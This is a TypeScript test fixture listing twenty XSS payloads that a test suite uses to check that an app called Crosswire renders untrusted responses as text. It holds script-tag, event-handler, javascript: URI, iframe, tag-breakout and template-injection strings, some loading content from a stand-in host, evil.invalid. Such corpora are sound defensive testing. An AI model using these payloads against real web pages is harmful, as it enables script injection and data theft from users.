// XSS payload corpus. These are inert test strings: they are only ever placed
// into mocked API responses so the gate can prove Crosswire renders captured
// bytes as text. Every payload that would reach out uses an absolute URL on a
// non-routable origin so a leak shows up as an off-origin request, and every
// script payload also sets window.__xss so execution is detectable even with
// no dialog or network side effect.
export const EVIL = 'http://evil.invalid';

export interface XssPayload {
  name: string;
  value: string;
}

export const XSS_CORPUS: readonly XssPayload[] = [
  { name: 'script', value: '<script>alert(1);window.__xss=1</script>' },
  { name: 'img-onerror', value: `<img src=${EVIL}/x.png onerror="alert(1);window.__xss=1">` },
  { name: 'anchor-javascript', value: '<a href="javascript:alert(1);window.__xss=1">click</a>' },
  { name: 'meta-refresh', value: `<meta http-equiv=refresh content="0;url=${EVIL}/refresh">` },
  { name: 'svg-onload', value: '<svg onload="alert(1);window.__xss=1"></svg>' },
  { name: 'svg-use', value: `<svg><use href="${EVIL}/sprite.svg#x"/></svg>` },
  { name: 'onmouseover', value: '<div onmouseover="alert(1);window.__xss=1" style="position:fixed;inset:0">x</div>' },
  { name: 'onfocus-autofocus', value: '<input autofocus onfocus="alert(1);window.__xss=1">' },
  { name: 'iframe-srcdoc', value: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: 'iframe-src', value: `<iframe src="${EVIL}/frame"></iframe>` },
  { name: 'data-uri', value: '<a href="data:text/html,<script>alert(1)</script>">d</a>' },
  { name: 'object', value: `<object data="${EVIL}/o.swf"></object>` },
  { name: 'embed', value: `<embed src="${EVIL}/e.swf">` },
  { name: 'link-stylesheet', value: `<link rel=stylesheet href="${EVIL}/x.css">` },
  { name: 'style-import', value: `<style>@import url(${EVIL}/i.css);</style>` },
  { name: 'form-action', value: `<form action="${EVIL}/f"><button autofocus formaction="javascript:alert(1)">x</button></form>` },
  { name: 'base-href', value: `<base href="${EVIL}/">` },
  { name: 'tag-breakout', value: '"><script>alert(1)</script>' },
  { name: 'attr-breakout', value: `' onmouseover='alert(1)` },
  { name: 'template-literal', value: '${alert(1)}{{constructor.constructor("alert(1)")()}}' },
];
